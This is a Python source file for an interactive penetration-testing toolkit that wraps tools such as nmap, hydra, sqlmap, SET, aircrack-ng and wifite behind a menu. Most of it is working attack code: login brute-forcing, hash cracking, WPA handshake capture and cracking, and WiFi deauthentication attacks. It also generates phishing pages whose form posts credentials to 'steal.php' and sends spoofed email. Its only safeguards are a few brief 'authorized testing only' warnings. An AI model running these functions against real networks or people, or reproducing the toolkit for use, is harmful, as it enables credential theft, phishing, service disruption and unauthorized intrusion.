#!/usr/bin/env python3
# pentraX_wsl.py - Full Pentesting Toolkit (WSL Compatible + Social Engineering)

import subprocess
import socket
import requests
import hashlib
import os
import ssl
import json
import time
import threading
import shutil
from urllib.parse import urlparse
import sys

# Add color output utilities
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def cprint(text, color):
    print(f"{color}{text}{Colors.ENDC}")

BANNER = f"""
{Colors.OKCYAN}
██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║ ╚███╔╝ 
██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
              FULL PENTEST TOOLKIT (WSL EDITION)

         {Colors.BOLD}Created by astra-incognito{Colors.ENDC}{Colors.OKCYAN}
         GitHub: https://github.com/astra-incognito/
"""

print(BANNER + Colors.ENDC)

if sys.platform != "linux" and sys.platform != "linux2":
    print("[!] This toolkit is only supported on Linux.")
    sys.exit(1)

def ensure_installed(cmd_name, install_cmd):
    if shutil.which(cmd_name) is None:
        print(f"[!] {cmd_name} not found. Installing...")
        subprocess.run(["sudo", "apt", "install", "-y"] + install_cmd.split())

def auto_install_dependencies():
    # List of required tools
    tools = [
        ("nmap", "nmap"),
        ("hydra", "hydra"),
        ("sqlmap", "sqlmap"),
        ("gobuster", "gobuster"),
        ("arp-scan", "arp-scan"),
        ("whois", "whois"),
        ("set", "set"),
        ("sendmail", "sendmail"),
        ("dig", "dnsutils"),
        ("aircrack-ng", "aircrack-ng"),
        ("wifite", "wifite"),
        ("reaver", "reaver"),
        ("hcxdumptool", "hcxdumptool"),
        ("hcxpcapngtool", "hcxtools"),
    ]
    for cmd, pkg in tools:
        if shutil.which(cmd) is None:
            print(f"[!] {cmd} not found. Installing {pkg}...")
            subprocess.run(["sudo", "apt", "install", "-y", pkg])
    # Download wordlists if missing
    wordlists = {
        "/usr/share/wordlists/rockyou.txt": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
        "/usr/share/wordlists/dirb/common.txt": "https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt",
        "/usr/share/wordlists/subdomains-top1million-5000.txt": "https://raw.githubusercontent.com/assetnote/commonspeak2-wordlists/master/subdomains/subdomains-top1million-5000.txt"
    }
    for path, url in wordlists.items():
        if not os.path.exists(path):
            print(f"[!] Wordlist not found: {path}. Downloading...")
            os.makedirs(os.path.dirname(path), exist_ok=True)
            try:
                r = requests.get(url)
                with open(path, "wb") as f:
                    f.write(r.content)
                print(f"[+] Downloaded {path}")
            except Exception as e:
                print(f"[-] Failed to download {path}: {e}")

# Logging results
import datetime

def log_result(name, data):
    with open(f"results_{name}.txt", "a") as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] {data}\n")

# ARP Scan
def arp_scan():
    ensure_installed("arp-scan", "arp-scan")
    cprint("[+] Scanning local network for live hosts (requires sudo)...", Colors.OKBLUE)
    try:
        result = subprocess.run(["sudo", "arp-scan", "-l"], capture_output=True, text=True)
        if result.returncode != 0:
            cprint("[-] arp-scan failed. Are you running with sudo?", Colors.FAIL)
            cprint(result.stderr, Colors.FAIL)
            return
        print(result.stdout)
        # Parse live hosts
        hosts = []
        for line in result.stdout.splitlines():
            if line and ":" in line and "." in line.split()[0]:
                hosts.append(line)
        if hosts:
            cprint(f"[+] Found {len(hosts)} live hosts:", Colors.OKGREEN)
            for h in hosts:
                print(h)
            log_result("arp", "\n".join(hosts))
        else:
            cprint("[!] No live hosts found.", Colors.WARNING)
    except Exception as e:
        cprint(f"[-] Error running arp-scan: {e}", Colors.FAIL)

# Nmap Wrapper
def nmap_scan(target):
    ensure_installed("nmap", "nmap")
    print(f"\n[+] Running Nmap scan on {target}")
    options = input("Nmap options (default -A): ").strip() or "-A"
    result = subprocess.run(["nmap"] + options.split() + [target], capture_output=True, text=True)
    print(result.stdout)
    # Highlight open ports
    open_ports = []
    for line in result.stdout.splitlines():
        if "/tcp" in line and "open" in line:
            print(f"[OPEN] {line}")
            open_ports.append(line)
    log_result("nmap", result.stdout)
    if not open_ports:
        print("[!] No open ports found by Nmap.")

# Hydra Wrapper
def hydra_scan(ip, username, service):
    ensure_installed("hydra", "hydra")
    wordlist = input("Hydra wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if os.path.exists(wordlist + ".gz"):
        subprocess.run(["gunzip", wordlist + ".gz"])
    print("\n[+] Brute-force login with Hydra")
    print(f"[+] Target: {ip} | User: {username} | Service: {service}")
    result = subprocess.run(["hydra", "-l", username, "-P", wordlist, f"{ip}", service], capture_output=True, text=True)
    print(result.stdout)
    # Show found passwords
    found = []
    for line in result.stdout.splitlines():
        if "login:" in line and "password:" in line:
            print(f"[FOUND] {line}")
            found.append(line)
    log_result("hydra", result.stdout)
    if not found:
        print("[!] No valid credentials found by Hydra.")

# SQLMap Wrapper
def sqlmap_scan(url):
    ensure_installed("sqlmap", "sqlmap")
    print("\n[+] Testing SQL Injection on target")
    options = input("SQLMap options (default --batch --crawl=1): ").strip() or "--batch --crawl=1"
    result = subprocess.run(["sqlmap", "-u", url] + options.split(), capture_output=True, text=True)
    print(result.stdout)
    # Show found vulnerabilities
    found = []
    for line in result.stdout.splitlines():
        if "is vulnerable" in line or "parameter" in line:
            print(f"[VULN] {line}")
            found.append(line)
    log_result("sqlmap", result.stdout)
    if not found:
        print("[!] No SQLi vulnerabilities found by SQLMap.")

# SEToolkit Wrapper (Social Engineering)
def setoolkit():
    ensure_installed("set", "set")
    print("\n[!] WARNING: Use the Social Engineering Toolkit (SET) only for authorized, ethical testing.")
    print("[!] SET requires sudo/root permissions.")
    print("[+] Launching Social Engineering Toolkit...")
    subprocess.run(["sudo", "setoolkit"])

# Fake Email Sender (Local spoof test only)
def spoof_email():
    import re
    def valid_email(addr):
        return re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", addr)
    sender = input("From (fake): ")
    recipient = input("To (real): ")
    if not valid_email(sender) or not valid_email(recipient):
        print("[-] Invalid email address format.")
        return
    subject = input("Subject: ")
    body = input("Body: ")
    print("\n[!] This will attempt to send mail using your system's sendmail or configured relay.")
    message = f"Subject: {subject}\nFrom: {sender}\nTo: {recipient}\n\n{body}"
    try:
        subprocess.run(["sendmail", recipient], input=message.encode())
        print("[+] Spoofed email sent.")
        log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")

# Phishing Page Generator (Static HTML)
def phishing_page():
    folder = "phish_page"
    os.makedirs(folder, exist_ok=True)
    print("[!] WARNING: Use phishing pages only for authorized, ethical testing.")
    use_custom = input("Use custom HTML template? (y/N): ").strip().lower() == 'y'
    if use_custom:
        html = input("Paste your custom HTML (end with a single line containing only END):\n")
        lines = []
        while True:
            line = input()
            if line.strip() == "END":
                break
            lines.append(line)
        html = "\n".join(lines)
    else:
        title = input("Page title: ")
        prompt = input("Prompt text (e.g. Enter your password): ")
        html = f"""
        <html><head><title>{title}</title></head>
        <body>
        <h2>{prompt}</h2>
        <form method='POST' action='steal.php'>
            <input name='user' placeholder='Username'><br>
            <input name='pass' type='password' placeholder='Password'><br>
            <input type='submit'>
        </form></body></html>
        """
    with open(os.path.join(folder, "index.html"), "w") as f:
        f.write(html)
    print(f"[+] Phishing page saved to ./{folder}/index.html")

# Port Scan (basic, using socket)
def port_scan(ip):
    try:
        port_range = input("Port range (e.g. 20-1024, default 1-1024): ")
        if '-' in port_range:
            start, end = map(int, port_range.split('-'))
        else:
            start, end = 1, 1024
    except Exception:
        start, end = 1, 1024
    print(f"[+] Scanning ports {start}-{end} on {ip}")
    open_ports = []
    for port in range(start, end+1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        try:
            s.connect((ip, port))
            banner = ""
            try:
                s.sendall(b'\r\n')
                banner = s.recv(1024).decode(errors='ignore').strip()
            except:
                pass
            print(f"[OPEN] Port {port} {'- ' + banner if banner else ''}")
            open_ports.append(f"{port} {banner}")
            log_result("portscan", f"{ip}:{port} OPEN {banner}")
        except:
            pass
        s.close()
    if not open_ports:
        print("[!] No open ports found in range.")

# Whois Lookup
def whois_lookup(domain):
    ensure_installed("whois", "whois")
    print(f"[+] Whois lookup for {domain}")
    result = subprocess.getoutput(f"whois {domain}")
    print(result)
    # Highlight key fields
    highlights = []
    for line in result.splitlines():
        if any(key in line.lower() for key in ["registrar", "creation date", "expiry", "expiration", "name server", "status", "updated date"]):
            highlights.append(line)
    if highlights:
        print("\n[+] Key Whois Info:")
        for h in highlights:
            print(h)
    log_result("whois", result)

# HTTP Headers Grabber
def headers_grabber(url):
    try:
        follow = input("Follow redirects? (y/N): ").strip().lower() == 'y'
        start = time.time()
        r = requests.get(url, allow_redirects=follow)
        elapsed = time.time() - start
        print(f"[+] Status: {r.status_code} | Time: {elapsed:.2f}s")
        print(f"[+] Headers for {url}:")
        for k, v in r.headers.items():
            print(f"{k}: {v}")
        if r.history:
            print("[!] Redirect chain:")
            for resp in r.history:
                print(f"  {resp.status_code} -> {resp.url}")
        log_result("headers", f"{url}\nStatus: {r.status_code}\nHeaders: {dict(r.headers)}\nTime: {elapsed:.2f}s")
    except Exception as e:
        print(f"[-] Error: {e}")

# Crack SHA256 Hash (simple wordlist attack)
def crack_hash(h):
    wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    hash_type = input("Hash type (sha256/sha1/md5, default sha256): ").strip().lower() or "sha256"
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return
    print(f"[+] Cracking {hash_type} hash using {wordlist} ...")
    hash_func = hashlib.sha256
    if hash_type == "md5":
        hash_func = hashlib.md5
    elif hash_type == "sha1":
        hash_func = hashlib.sha1
    found = False
    with open(wordlist, "rb") as f:
        for i, word in enumerate(f, 1):
            word = word.strip()
            if hash_func(word).hexdigest() == h:
                print(f"[+] Hash cracked: {word.decode()}")
                log_result("crackhash", f"{h} = {word.decode()}")
                found = True
                break
            if i % 100000 == 0:
                print(f"  ...{i} words tried...")
    if not found:
        print("[-] Hash not found in wordlist.")

# DNS Lookup
def dns_lookup(domain):
    import subprocess
    print(f"[+] DNS lookup for {domain}")
    records = {}
    for rtype in ["A", "AAAA", "MX", "TXT"]:
        try:
            result = subprocess.getoutput(f"dig +short {domain} {rtype}")
            if result.strip():
                records[rtype] = result.strip().splitlines()
        except Exception as e:
            print(f"[-] Error fetching {rtype} records: {e}")
    if records:
        for rtype, values in records.items():
            print(f"{rtype} records:")
            for v in values:
                print(f"  {v}")
        log_result("dns", f"{domain}: {records}")
    else:
        print("[-] No DNS records found.")

# SSL Certificate Info
def ssl_info(domain):
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
        try:
            s.connect((domain, 443))
            cert = s.getpeercert()
            if not isinstance(cert, dict):
                print("[-] Could not retrieve certificate details.")
                return
            print(f"[+] SSL cert for {domain}:")
            subject = {k: v for t in cert['subject'] for k, v in t} if 'subject' in cert else {}
            issuer = {k: v for t in cert['issuer'] for k, v in t} if 'issuer' in cert else {}
            print(f"  Subject: {subject}")
            print(f"  Issuer: {issuer}")
            exp = cert['notAfter'] if 'notAfter' in cert else None
            print(f"  Expiry: {exp}")
            # Warn if expired or self-signed
            import datetime
            if exp and isinstance(exp, str):
                try:
                    exp_dt = datetime.datetime.strptime(exp, '%b %d %H:%M:%S %Y %Z')
                    if exp_dt < datetime.datetime.utcnow():
                        print("[!] Certificate is EXPIRED!")
                except Exception:
                    pass
            if subject and issuer and subject == issuer:
                print("[!] Certificate is self-signed!")
            log_result("ssl", json.dumps(cert))
        except Exception as e:
            print(f"[-] Error: {e}")

# Subdomain Finder (basic, using wordlist)
def find_subdomains(domain):
    wordlist = input("Subdomain wordlist path (default /usr/share/wordlists/subdomains-top1million-5000.txt): ").strip() or "/usr/share/wordlists/subdomains-top1million-5000.txt"
    if not os.path.exists(wordlist):
        print("[-] Subdomain wordlist not found!")
        return
    print(f"[+] Finding subdomains for {domain}")
    found = []
    with open(wordlist) as f:
        for i, sub in enumerate(f, 1):
            sub = sub.strip()
            subdomain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                print(f"[FOUND] {subdomain}")
                found.append(subdomain)
            except:
                pass
            if i % 500 == 0:
                print(f"  ...{i} subdomains tested...")
    if found:
        print(f"[+] {len(found)} subdomains found.")
        log_result("subdomains", "\n".join(found))
    else:
        print("[!] No subdomains found.")

# Directory Bruteforce (basic, using wordlist)
def dir_bruteforce(base):
    wordlist = input("Dir wordlist path (default /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        print("[-] Dirb wordlist not found!")
        return
    print(f"[+] Bruteforcing directories on {base}")
    found = []
    with open(wordlist) as f:
        for i, line in enumerate(f, 1):
            path = line.strip()
            url = f"{base}/{path}"
            try:
                r = requests.get(url)
                if r.status_code == 200:
                    print(f"[FOUND] {url} [200]")
                    found.append(url)
                else:
                    print(f"[X] {url} [{r.status_code}]")
            except:
                pass
            if i % 100 == 0:
                print(f"  ...{i} paths tested...")
    if found:
        print(f"[+] {len(found)} directories found.")
        log_result("dirbrute", "\n".join(found))
    else:
        print("[!] No directories found.")

# CVE Search (using cve.circl.lu API)
def cve_lookup(keyword):
    try:
        url = f"https://cve.circl.lu/api/search/{keyword}"
        r = requests.get(url)
        data = r.json()
        results = data.get("data", [])
        if not results:
            print("[-] No CVEs found.")
            return
        for item in results[:5]:
            print(f"CVE: {item.get('id')} - {item.get('summary')}")
            print(f"  CVSS: {item.get('cvss')}")
            print(f"  Published: {item.get('Published')}")
            print(f"  References: {item.get('references')[:2]}")
        log_result("cve", json.dumps(results[:5]))
    except Exception as e:
        print(f"[-] Error: {e}")

# Gobuster Dir Scan (wrapper)
def gobuster_scan(target_url):
    ensure_installed("gobuster", "gobuster")
    wordlist = input("Gobuster wordlist path (default /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"
    print(f"[+] Running gobuster on {target_url}")
    result = subprocess.run(["gobuster", "dir", "-u", target_url, "-w", wordlist], capture_output=True, text=True)
    found = []
    for line in result.stdout.splitlines():
        if line.startswith("/") and "Status:" in line:
            print(line)
            found.append(line)
    if found:
        print(f"[+] {len(found)} directories found.")
        log_result("gobuster", "\n".join(found))
    else:
        print("[!] No directories found by gobuster.")

def osint_wordlist_generator():
    print("[+] OSINT Wordlist Generator")
    name = input("Target's full name: ").strip()
    nickname = input("Nickname/alias (optional): ").strip()
    company = input("Company/organization (optional): ").strip()
    birth_year = input("Birth year (optional): ").strip()
    keywords = input("Other keywords (comma separated): ").strip().split(",")
    base = []
    if name:
        parts = name.split()
        base.extend(parts)
        base.append(name.replace(" ", ""))
    if nickname:
        base.append(nickname)
    if company:
        base.append(company)
    if birth_year:
        base.append(birth_year)
    base.extend([k.strip() for k in keywords if k.strip()])
    # Generate variations
    wordlist = set()
    for word in base:
        wordlist.add(word)
        wordlist.add(word.lower())
        wordlist.add(word.upper())
        wordlist.add(word.capitalize())
        for suffix in ["123", "!", "2023", "2024", "#", "@", "1", "01"]:
            wordlist.add(word + suffix)
    # Save to file
    fname = input("Save wordlist as (default osint_wordlist.txt): ").strip() or "osint_wordlist.txt"
    with open(fname, "w") as f:
        for w in sorted(wordlist):
            f.write(w + "\n")
    print(f"[+] Wordlist saved to {fname} ({len(wordlist)} entries)")

def wifi_scan():
    print("[+] Scanning for WiFi networks (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    print("[*] Press Ctrl+C to stop scanning.")
    try:
        subprocess.run(["sudo", "airodump-ng", mon_iface])
    except KeyboardInterrupt:
        print("[!] Scan stopped.")
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])

def wifi_handshake_capture():
    print("[+] Capture WPA handshake (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    bssid = input("Target BSSID (AP MAC): ").strip()
    channel = input("Channel: ").strip()
    out_file = input("Output file (default: handshake.cap): ").strip() or "handshake.cap"
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    print("[*] Capturing handshake. Press Ctrl+C when done.")
    try:
        subprocess.run(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out_file.replace('.cap',''), mon_iface])
    except KeyboardInterrupt:
        print("[!] Capture stopped.")
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
    print(f"[+] Handshake saved to {out_file}")

def wifi_crack_handshake():
    print("[+] Crack WPA/WPA2 handshake with aircrack-ng or hashcat...")
    cap_file = input("Handshake .cap file: ").strip()
    wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    print("[*] Cracking with aircrack-ng...")
    subprocess.run(["aircrack-ng", "-w", wordlist, cap_file])
    # Optionally, add hashcat support here

def wifi_deauth_attack():
    print("[+] Deauthentication attack (requires monitor mode and root)...")
    iface = input("Wireless interface (e.g. wlan0): ").strip()
    bssid = input("Target BSSID (AP MAC): ").strip()
    client = input("Target client MAC (leave blank for broadcast): ").strip()
    print("[*] Enabling monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    print(f"[*] Using monitor interface: {mon_iface}")
    if client:
        print(f"[*] Sending deauth packets to {client} on {bssid}")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, mon_iface])
    else:
        print(f"[*] Sending broadcast deauth packets on {bssid}")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, mon_iface])
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])

def wifi_wifite():
    print("[+] Launching Wifite (automated WiFi attack tool)...")
    subprocess.run(["sudo", "wifite"])

# Split menu into core and advanced
core_menu = """
1. ARP Scan
2. Port Scan
3. Whois Lookup
4. HTTP Headers
5. Crack SHA256 Hash
6. DNS Lookup
7. SSL Certificate Info
8. Subdomain Finder
9. Directory Bruteforce
10. CVE Search
99. More Tools
0. Exit
"""

more_menu = """
11. Gobuster Dir Scan
12. Nmap Full Scan
13. Hydra Login Bruteforce
14. SQLMap Injection Scan
15. Social Engineering Toolkit (SET)
16. Fake Email Spoof (local test)
17. Phishing Page Generator
18. OSINT Wordlist Generator
19. WiFi Network Scan
20. Capture WPA Handshake
21. Crack WPA Handshake
22. Automated WiFi Attack (Wifite)
0. Back
"""

# Print core menu with color
def print_core_menu():
    cprint(core_menu, Colors.OKBLUE)
# Print more menu with color
def print_more_menu():
    cprint(more_menu, Colors.OKCYAN)

print_core_menu()

showing_more = False
while True:
    if not showing_more:
        choice = input("Select Option > ")
    else:
        choice = input("[More Tools] Select Option > ")
    if not showing_more:
        if choice == "1":
            arp_scan()
        elif choice == "2":
            ip = input("Target IP: ")
            port_scan(ip)
        elif choice == "3":
            domain = input("Domain: ")
            whois_lookup(domain)
        elif choice == "4":
            url = input("URL (http/https): ")
            headers_grabber(url)
        elif choice == "5":
            h = input("SHA256 hash: ")
            crack_hash(h)
        elif choice == "6":
            domain = input("Domain: ")
            dns_lookup(domain)
        elif choice == "7":
            domain = input("Domain (no http): ")
            ssl_info(domain)
        elif choice == "8":
            domain = input("Domain: ")
            find_subdomains(domain)
        elif choice == "9":
            base = input("Base URL (http/https): ")
            dir_bruteforce(base)
        elif choice == "10":
            keyword = input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): ")
            cve_lookup(keyword)
        elif choice == "99":
            print_more_menu()
            showing_more = True
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid option.")
    else:
        if choice == "11":
            target_url = input("Target URL (http/https): ")
            gobuster_scan(target_url)
        elif choice == "12":
            target = input("Target for Nmap: ")
            nmap_scan(target)
        elif choice == "13":
            ip = input("Target IP: ")
            user = input("Username: ")
            service = input("Service (e.g. ssh, ftp): ")
            hydra_scan(ip, user, service)
        elif choice == "14":
            url = input("URL vulnerable to SQLi: ")
            sqlmap_scan(url)
        elif choice == "15":
            setoolkit()
        elif choice == "16":
            spoof_email()
        elif choice == "17":
            phishing_page()
        elif choice == "18":
            osint_wordlist_generator()
        elif choice == "19":
            wifi_scan()
        elif choice == "20":
            wifi_handshake_capture()
        elif choice == "21":
            wifi_crack_handshake()
        elif choice == "22":
            wifi_wifite()
        elif choice == "0":
            print_core_menu()
            showing_more = False
        else:
            print("Invalid option.")
